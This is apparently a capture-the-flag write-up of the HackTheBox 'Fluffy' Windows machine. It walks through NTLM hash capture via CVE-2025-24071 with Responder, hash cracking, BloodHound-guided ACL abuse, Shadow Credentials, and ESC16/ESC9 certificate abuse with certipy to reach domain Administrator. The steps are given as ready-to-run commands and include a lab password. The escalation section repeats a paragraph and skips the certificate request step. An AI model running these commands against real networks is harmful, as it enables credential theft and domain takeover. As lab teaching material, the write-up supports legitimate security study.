Summary
#

Fluffy is an easy Windows machine that simulates an assumed-breach scenario, providing initial access through the credentials of a low-privileged user. By leveraging CVE-2025–24071, it is possible to capture the credentials of another low-privileged account. Further Active Directory enumeration reveals exploitable ACL relationships involving the winrm_svc and ca_svc accounts. These permissions can be abused to gain access to the winrm_svc account and establish a WinRM session on the target. Finally, misconfigurations in Active Directory Certificate Services (AD CS), including ESC16-related conditions, can be leveraged through the ca_svc account to obtain administrative access to the domain.

Vulnerability Discovery
#

After checking each CVE Id one by one on Google to find what they are about, the “CVE-2025-24071” seemed useful to us

The vulnerability can be summarized as:

  • CVE-2025-24071: is a critical zero-click Windows File Explorer vulnerability that leaks NTLMv2 hashes. By placing a malicious .library-ms file inside a ZIP/RAR archive, an attacker can cause Windows Explorer to automatically connect to an attacker-controlled SMB server and authenticate, exposing the victim’s NTLMv2 hash without requiring the file to be opened.

As we saw zip files already present and extracted in the SMB share, it is possible that they are being extracted by some user (automatically ofcourse in this HTB lab). To make such a .library-ms file that points to our SMB server, we can look for already created POC exploits on Google. We found one such script at: GitHub:

We can download it with git:

└─$ git clone https://github.com/0x6rss/CVE-2025-24071_PoC.git

To use the exploit POC, we need to provide it the name of the file and our ip address. Here we will provide the IP of our tun0 interface created by the HTB lab’s OpenVPN:

└─$ cd CVE-2025-24071_PoC

└─$ chmod +x poc.py

To run the exploit, we need to have python installed in our system:

└─$ python3 poc.py

A file named “exploit.zip” will be created in our current directory which we can upload to the IT share. But before uploading, we need to start an SMB Listener on our attack host. Responder is a tool that can be used in such NTLM hash stealing attacks. To start it:

└─$ sudo responder -I tun0

Now upload the file to the share with netexec:

└─$ sudo nxc smb $TARGET_IP -u 'j.fleischman' -p 'J0elTHEM4n1990!' --share IT --pu-file exploit.zip exploit.pdf

As soon as the exploit.zip is extracted, we got a hit for a NTLMv2 hash in our responder tab:

As this is in hash form, we need to crack it to get the plaintext password. Save the hash in a file and we will use hashcat with the rockyou.txt wordlist with hash mode 5600:

└─$ hashcat -m 5600 p.agila-NTLMv2.hash /usr/share/wordlists/rockyou.txt

The password is cracked. Now to map our AD network, we can use bloodhound. It will show us the details of AD in a clean GUI form from where it is easy to identify and plan our next attack path:

We can run the bloodhound python based collector directly from our kali machine:

└─$ bloodhound-ce-python -c all -u 'p.agila' --hashes '<P.Agila_Password>' -d 'fluffy.htb' -ns $TARGET_IP --dns-tcp --zip

After the collection work is done, open the bloodhound tool and upload the collection zip:

└─$ bloodhound

The user “p.agila” has indirectly “GenericAll” rights on the Active Directory group “Service Accounts”. Using the privileges, we can add ourselves or any other user we like to the respected group. Checking the “Outbound Object Control” of the “Service Accounts”, it revealed this group has “GenericWrite” on 3 users.

WINRM_SVC and CA_SVC look useful as the first one has the Group Membership of “Remote Management Users” which means if we compromise this user we can get internal access to the machine. Regarding the CA_SVC, this user is marked Diamond Shape by bloodhound automatically and confirming the group membership of this user as well, we found out that it is a member of “Cert Publishers” which is a group regarding Active Directory Certificate Services (ADCS)

To compromise both of them, we can simply click the “GenericWrite” word and bloodhound will suggest us some attack paths we can choose. But first, we need to have the membership of this group. So we will again select p.agila in bloodhound and see what attack path we have to get in the group:

Here bloodhound is suggesting us that we can modify the group membership. So we will take the path:

└─$ net rpc group addmem "SERVICE ACCOUNTS" 'j.fleischman' -U "fluffy.htb"/"p.agila"%"<P.Agila_Password>" -S "DC01.fluffy.htb"

We are adding our initial user “j.fleischman” to the group so it will inherit the group privileges. After adding, we can confirm the group membership with:

└─$ net rpc group members "SERVICE ACCOUNTS" -U "fluffy.htb"/"p.agila"%"<P.Agila_Password>" -S "DC01.fluffy.htb" 

FLUFFY\ca_svc
FLUFFY\ldap_svc
FLUFFY\winrm_svc
FLUFFY\j.fleischman

Now going to the compromising of other two accounts:

We can add Shadow Credentials to the two accounts which will allow us to authenticate as them with the NT hash or ccache kerberos file provided as output by our next tool “bloodyad”:

# For WINRM_SVC
└─$bloodyad -u 'j.fleischman' -p 'J0elTHEM4n1990!' -d 'fluffy.htb' -i '$TARGET_IP' add shadowCredentials 'WINRM_SVC'

# For CA_SVC
└─$ bloodyad -u 'winrm_svc' -p ':<WINRM_SVC-NTHash>' -d 'fluffy.htb' -i '$TARGET_IP' add shadowCredentials 'CA_SVC'

Foothold
#

With the NT hash of WINRM_SVC, we can login to the host through the WinRM port (5985):

└─$ evil-winrm -i DC01.fluffy.htb -u 'fluffy.htb\winrm_svc' -H '<WINRM_SVC-NTHash>'

We will be initially dropped into the Documents folder but we can switch to Desktop where the flag will be waiting for us :)

Escalating Privileges
#

Now as we already found out that there is ADCS being present, we can look for the ADCS Attacks. The SpecterOps team introduced several ADCS attack techniques in their whitepaper Certified Pre-Owned, categorizing them as ESC1 – ESC8.

Certipy
#

The tool for enumerating and attacking ADCS vulnerabilities on linux is certipy whereas on windows we have it as certify.exe. To use the linux variant, we can download it with apt on Debain based systems as:

└─$ sudo apt update && sudo apt install certipy-ad -y

To enumerate the vulnerabilities, we can use the -vulnerable flag in the tool’s command:

└─$ certipy find -u ca_svc@fluffy.htb -hashes ':<CA_SVC-NTHash>' -target $TARGET_IP -vulnerable -stdout

The tool didn’t found any vulnerable templates in ADCS but marked the ADCS itself as being vulnerable to ESC16 attack. We can search on Google what ESC16 is and how we can perform the attack.

Reviewing the SpecterOps documentation:

Search on google we found the website of SpecterOPS:

On the bottom of the page, there is a note:

So we can first refer to ESC9 for exploitation techniques. The vulnerability criteria section describes what should be present for the exploitation to succeed. It can be summarized as:

ESC9 Requirements:

  1. Strong certificate mapping is not fully enforced

    • StrongCertificateBindingEnforcement ≠ 2, or
    • CertificateMappingMethods includes the UPN mapping flag (0x4).

  2. The certificate template has:

    • CT_FLAG_NO_SECURITY_EXTENSION enabled.

  3. The certificate template allows:

    • Client Authentication.

  4. The attacker has:

    • GenericWrite (or equivalent control) over any user account (A), which can then be leveraged to impersonate another user (B) via certificate abuse.

ESC9 Exploitation
#

The User template satisfies the client authentication requirement, the CA is vulnerable to ESC16, and our control over CA_SVC through GenericWrite satisfies the required account-control condition.

As all of the required conditions are met, we can proceed with the privilege escalation. To obtain a certificate for the Administrator account, we can change the UPN of CA_SVC to Administrator, request a certificate using the credentials of CA_SVC, and then revert the UPN to its original value. Since the certificate is issued while the UPN is set to Administrator, it will be mapped to the Administrator account. We can then use the issued certificate to authenticate as Administrator and retrieve the corresponding NT hash.

As these checks are all marked true, we can successfully privilege escalate. To get the certificate as the Administrator user, we can change the UPN of CA_SVC to Administrator, request the certificate using the credentials of CA_SVC and because the UPN points to Administrator, we will be returned certificate for Administrator. Then we can revert the UPN back to original and get the authentication ticket and the NT hash using the issued certificate.

To change the UPN of CA_SVC to Administrator:

└─$ certipy account update -u winrm_svc@fluffy.htb -hashes ':<WINRM_SVC-NTHash>' -user ca_svc -upn Administrator@fluffy.htb -target $TARGET_IP

└─$ certipy auth -pfx administrator.pfx  -domain fluffy.htb -dc-ip $TARGET_IP

Authenticating as Administrator
#

We can use either the hash or the ccache ticket file with winrm to get access as Administrator:

└─$ evil-winrm -i $TARGET_IP -u 'fluffy.htb\Administrator' -H '<Administrator-Hash>'

Again the root.txt will be available in Desktop of Administrator

Fluffy provided an excellent introduction to modern Active Directory attack paths, combining NTLM hash capture, ACL abuse, Shadow Credentials, and AD CS misconfigurations to achieve full domain compromise.
